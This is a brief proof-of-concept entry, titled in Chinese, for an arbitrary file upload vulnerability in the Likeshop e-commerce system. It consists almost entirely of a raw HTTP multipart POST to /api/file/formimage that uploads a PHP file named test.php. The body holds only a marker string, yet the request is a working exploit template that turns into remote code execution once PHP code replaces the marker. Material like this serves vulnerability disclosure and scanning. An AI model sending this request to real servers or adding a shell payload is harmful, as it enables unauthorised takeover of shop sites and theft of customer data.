## Likeshop-formimage任意文件上传


## poc
```
POST /api/file/formimage HTTP/2
Host: x.x.x.
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
Connection: close
Content-Length: 201
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Accept-Encoding: gzip, deflate

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="file";filename="test.php"
Content-Type: application/x-php

This page has a vulnerability!
------WebKitFormBoundarygcflwtei--
```
